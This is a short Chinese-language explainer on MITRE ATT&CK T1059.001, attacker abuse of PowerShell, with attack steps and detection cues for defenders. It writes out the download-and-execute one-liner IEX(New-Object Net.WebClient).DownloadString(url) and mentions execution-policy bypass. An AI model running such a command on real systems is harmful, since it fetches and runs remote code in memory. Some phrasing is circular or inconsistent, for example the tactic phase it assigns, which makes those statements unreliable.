...
> **PowerShell就是用PowerShell执行各种恶意操作。**

## 30秒速查卡

| 维度 | 你需要知道的 |
|------|-------------|
| 这是什么？ | PowerShell就是用PowerShell执行各种恶意操作。 |
...
> 📚 **打个比方**：就像维修工拿着物业的万能钥匙，可以打开大楼里任何一扇门——PowerShell是Windows系统的"万能管理工具"，攻击者利用它可以在目标系统上执行任何操作，包括下载恶意软件、窃取数据、横向移动等。

**技术原理：**
T1059.001 是 命令和脚本解释器（T1059）的子技术，专注于PowerShell这一特定方面。攻击者在防御削弱阶段，通过PowerShell来获取目标系统或组织的相关信息，为后续攻击步骤做准备。
...
1. **获取目标系统访问** - 通过钓鱼或其他方式获得初始执行权限
2. **启动PowerShell终端** - 调用powershell.exe或pwsh.exe启动环境
3. **执行IEX下载脚本** - 使用Invoke-Expression从远程URL下载恶意脚本
4. **绕过执行策略** - 使用-ExecutionPolicy Bypass等参数绕过限制
5. **从内存加载载荷** - 脚本在内存中解码执行，不写入磁盘
...
**用人话说：** 攻击者滥用PowerShell执行恶意代码，因为PowerShell是Windows自带的合法工具，不会被安全软件拦。经典的操作用法是IEX(New-Object Net.WebClient).DownloadString(url)下载远程恶意脚本直接执行，全程不写磁盘只存在内存中。如果看到powershell.exe在不正常的场景运行（如从Office宏、计划任务、WMI调用），或者命令行包含-enc、-e（Base64编码参数）和IEX（调用表达式），几乎可以确定是攻击行为。
